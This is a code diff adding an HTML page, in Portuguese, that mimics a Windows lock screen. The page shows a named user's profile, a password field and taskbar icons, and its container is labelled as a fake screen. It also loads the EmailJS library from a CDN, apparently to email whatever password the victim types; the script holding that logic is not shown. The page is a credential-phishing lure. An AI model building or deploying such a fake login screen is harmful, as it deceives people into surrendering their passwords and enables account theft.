@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login do Windows</title>
+    <link rel="stylesheet" href="styles.css">
+    <script defer src="script.js"></script>
+</head>
+<body>
+   <div class="telaFake">
+        <div class="IconLogin"><img src="pesrson.png" alt=""></div>
+        <div class="nameUser">João Vitor Santos</div>
+        <div class="login-container">
+            <div class="login-box">
+                <form class="login-form">
+                    <div class="password-wrapper">
+                        <input type="password" id="password" name="password" placeholder="Digite sua senha" required>
+                        <span class="toggle-password" id="toggle-password">
+                            <img src="eye.png" alt="Mostrar senha">
+                        </span>
+                        <button id="entrar" type="button" onclick="Acessar()">&rarr;</button>
+                    </div>
+                </form>
+                <div><h4 id="senhaInvalida"></h4></div>
+                <h4>Trocar usuario</h4>
+            </div>
+        </div>
+    </div>
+    <footer>
+        <img src="wifi.icon.png" alt="">
+        <img src="hdmi.icon.png" alt="">
+        <img src="power.icon.png" alt="">
+    </footer>
+   <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
+</body>
+</html>
